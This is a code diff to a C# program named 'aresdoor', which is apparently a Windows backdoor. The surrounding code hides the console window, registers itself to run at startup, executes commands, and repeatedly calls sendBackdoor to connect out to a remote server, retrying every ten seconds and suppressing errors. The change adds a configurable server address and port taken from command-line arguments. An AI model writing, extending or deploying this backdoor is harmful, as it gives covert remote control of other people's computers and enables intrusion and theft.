@@ -7,6 +7,10 @@ namespace aresdoor
         private static string shellcode_ = System.IO.Directory.GetCurrentDirectory() + "> ";
         private static byte[] shellcode = System.Text.Encoding.ASCII.GetBytes(shellcode_);
 
+        // Modify these variables as needed.
+        private static string server = "localhost";
+        private static int port = 9000;
+
         private static string exec(string cmd)
         {
             System.Diagnostics.Process p = new System.Diagnostics.Process();
@@ -94,8 +98,21 @@ namespace aresdoor
 
         static void Main(string[] args)
         {
+            /*
+             * Usage:
+             *      ./aresdoor.exe [server] [port]
+             *      or
+             *      ./aresdoor.exe (no args) << requires varables to be configured properly
+             * 
+             */
             var handle = GetConsoleWindow();
             ShowWindow(handle, SW_HIDE); // hide window
+
+            if (args.Length >= 2)
+            {
+                server = args[0];
+                port = Int32.Parse(args[1]);
+            }
 
             SetStartup();
 
@@ -105,16 +122,12 @@ namespace aresdoor
                 {
                     try
                     {
-                        sendBackdoor("localhost", 9000);
+                        Console.WriteLine("Sending backdoor to: {0}, port: {1}", server, port);
+                        sendBackdoor(server, port);
                     }
                     catch (Exception)
                     { } // pass silently
-                    Console.WriteLine("another backdoor sent");
-                } else
-                {
-                    Console.WriteLine("Internet Connection Failed.");
                 }
-
                 System.Threading.Thread.Sleep(10000); // sleep for 10 seconds before retrying
             }
         }
